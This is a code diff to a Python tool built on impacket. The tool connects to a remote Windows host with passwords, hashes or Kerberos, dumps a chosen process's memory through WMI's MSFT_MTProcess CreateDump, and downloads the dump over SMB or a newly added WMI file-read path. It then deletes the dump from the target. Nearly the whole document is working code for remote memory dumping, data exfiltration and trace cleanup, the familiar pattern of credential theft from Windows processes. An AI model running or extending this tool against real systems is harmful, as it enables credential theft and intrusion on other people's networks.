@@ -7,6 +7,7 @@ import tempfile
 import argparse
 import logging
 import socket
+import struct
 from io import BytesIO
 from collections import OrderedDict
 from impacket.examples.utils import parse_target
@@ -15,6 +16,30 @@ from impacket.dcerpc.v5.dtypes import NULL
 from impacket.dcerpc.v5.dcom.wmi import DCERPCSessionError
 from impacket.dcerpc.v5.dcomrt import DCOMConnection, NULL
 from impacket.smbconnection import SMBConnection, SessionError
+
+def patch_impacket_wmi():
+    from impacket.dcerpc.v5.dcom.wmi import ENCODED_VALUE
+
+    _original = ENCODED_VALUE.getValue
+
+    @staticmethod
+    def _fast_getValue(cimType, entry, heap):
+        if cimType == 0x2011:
+            try:
+                if isinstance(entry, int):
+                    heapOffset = entry
+                else:
+                    heapOffset = struct.unpack('<I', entry)[0]
+                heapData = heap[heapOffset:]
+                numItems = struct.unpack('<I', heapData[:4])[0]
+                return heapData[4:4 + numItems]
+            except Exception:
+                return _original(cimType, entry, heap)
+        return _original(cimType, entry, heap)
+
+    ENCODED_VALUE.getValue = _fast_getValue
+
+patch_impacket_wmi()
 
 class SMB:
     def __init__(self, target, username='', password='', domain='', hashes=None, aesKey=None, doKerberos=False, kdcHost=None):
@@ -108,16 +133,14 @@ class WMI:
             self.dcom.disconnect()
 
 def process_file_data(file_data, out_file):
-    location = tempfile.gettempdir()
-    output = os.path.join(location, out_file)
-    print(f'Writing file to {output}')
+    print(f'Writing file to {out_file}')
     try:
         file_length_bytes = bytes(file_data[0:4])
         file_length_bytes = file_length_bytes[::-1]
         file_length = int.from_bytes(file_length_bytes, byteorder='little', signed=False)
         file_bytes = bytes(file_data[4:file_length + 4])
 
-        with open(output, 'wb') as f:
+        with open(out_file, 'wb') as f:
             f.write(file_bytes)
             
         return True
@@ -126,38 +149,41 @@ def process_file_data(file_data, out_file):
         print("Error processing file data:", str(e))
         return False
 
-def read_file(options, dump_path, out_name):
-    # This likely won't work, WS-Mans default packet size is 512kb, and most memory dumps likely will be larger.
+def read_file(options, dump_path):
     # https://gist.github.com/mattifestation/03079a38f23e0c94c8cd39779f88adf6
-
     dump_path = str(dump_path)
+    _, filename = ntpath.split(dump_path)
+    local_path = os.path.join('.', filename)
     target_namespace = '//./root/Microsoft/Windows/Powershellv3'
     domain, username, password, address = parse_target(options.target)
     try:
-        wmi = WMI(address, target_namespace, username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip)
-        wmi.connect()
+        wmi_conn = WMI(address, target_namespace, username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip)
+        wmi_conn.connect()
         print('Connected to psv3')
-        time.sleep(5)
+
         try:
-            print(f'Getting file {dump_path}')
-            file_contents, methods = wmi.iWbemServices.GetObject(f"PS_ModuleFile.InstanceID='{dump_path}'")
-            instance = file_contents.SpawnInstance()
-            props = instance.getProperties()
+            print(f'Downloading {dump_path} over WMI')
+            escaped_path = dump_path.replace('\\', '\\\\')
+            file_instance = wmi_conn.get_object(f'PS_ModuleFile.InstanceID="{escaped_path}"')
+
+            props = file_instance.getProperties()
             file_data = props['FileData']['value']
+
             if file_data:
-                file_content = process_file_data(file_data, out_name)
-                if file_content:
+                if process_file_data(file_data, local_path):
                     print('Success')
                 else:
                     print('Failed')
+            else:
+                print('FileData is empty')
 
         except Exception as e:
             print("An error occurred:", str(e))
-    
-        wmi.close()
+
+        wmi_conn.close()
     except Exception as e:
         print(e)
-        wmi.close()
+        wmi_conn.close()
 
 def download_over_smb(options, file_path):
     domain, username, password, address = parse_target(options.target)
@@ -174,7 +200,7 @@ def download_over_smb(options, file_path):
     local_path = os.path.join('.', filename)
 
     if smb.connect():
-        print(f'  Downloading {file_path}')
+        print(f'Downloading {file_path} over SMB')
         raw_data = smb.read_file_raw(share, remote_path)
         with open(local_path, 'wb') as file:
             file.write(raw_data)
@@ -182,20 +208,18 @@ def download_over_smb(options, file_path):
         print(f'File saved to {local_path}')
     return
 
-
 def get_id_from_name(options):
-    #TODO: Convert this from Win32_Process to MSFT_MTProcess
     process_id = None
-    target_namespace = '//./root/CIMv2'
+    target_namespace = '//./root/Microsoft/Windows/ManagementTools'
     domain, username, password, address = parse_target(options.target)
     try:
-        print('Connecting to CIMv2')
+        print('Connecting to ManagementTools')
         wmi = WMI(address, target_namespace, username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip)
         wmi.connect()
 
         print('  Getting pid from process name')
         try:
-            iEnumWbemClassObject = wmi.iWbemServices.ExecQuery(f"Select ProcessId from Win32_Process where Name = '{options.proc}'")
+            iEnumWbemClassObject = wmi.iWbemServices.ExecQuery(f"Select ProcessId from MSFT_MTProcess where Name = '{options.proc}'")
             while True:
                     objects = iEnumWbemClassObject.Next(0xffffffff, 1)
                     if len(objects) == 0:
@@ -203,7 +227,7 @@ def get_id_from_name(options):
                     for obj in objects:
                         process_id = obj.getProperties()['ProcessId']['value']
                         if process_id:
-                            return process_id            
+                            return process_id
         except Exception as e:
             if str(e).find('S_FALSE') < 0:
                 print(e)
@@ -213,6 +237,7 @@ def get_id_from_name(options):
         print(f"An error occured attempting to get the process ID")
         wmi.close()
         return None
+
 
 # $instance = Get-WmiObject -NameSpace root\Microsoft\Windows\ManagementTools -Class MSFT_MTProcess -Filter "ProcessId=612"
 # Invoke-WmiMethod -InputObject $instance -Name CreateDump
@@ -266,9 +291,14 @@ def create_dump(options):
                     dump_file = new_name
 
             if options.download:
-                download_over_smb(options, dump_file)
-            # downloading through WMI without an event sub is unlikely
-            #read_file(options, dump_file, out_name)
+                if options.dlproto:
+                    if options.dlproto.lower() == 'wmi':
+                        read_file(options, dump_file)
+                        
+                    else: #just fallback to smb
+                        download_over_smb(options, dump_file)
+                else:
+                    download_over_smb(options, dump_file)
 
             if options.cleanup:
                 cleanup_dump_file(options, dump_file)
@@ -315,7 +345,7 @@ def cleanup_dump_file(options, dump_file):
     try:
         wmi = WMI(address, target_namespace, username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip)
         wmi.connect()
-        print(f'Removing {dump_file}')
+        print(f'Removing {dump_file} from {address}')
         try:
             obj, _ = wmi.iWbemServices.GetObject(f"CIM_DataFile.Name='{dump_file_escaped}'")
             obj.Delete(dump_file_escaped)
@@ -336,7 +366,8 @@ def main():
     parser.add_argument('-pid', action='store', help='process ID to dump')
     parser.add_argument('-proc', action='store', help='process name to dump')
     parser.add_argument('-rename', action='store', help='rename file after dump')
-    parser.add_argument('-download', action='store_true', help='download file over SMB')
+    parser.add_argument('-download', action='store_true', help='download file over SMB or WMI')
+    parser.add_argument('-dlproto', action='store', help='specify download protocol SMB or WMI')
     parser.add_argument('-cleanup', action='store_true', help='remove file after download')
     parser.add_argument('-cimv2', action='store_true', help='Connect to CIMv2 instead of management tools namespace')
     group = parser.add_argument_group('authentication')
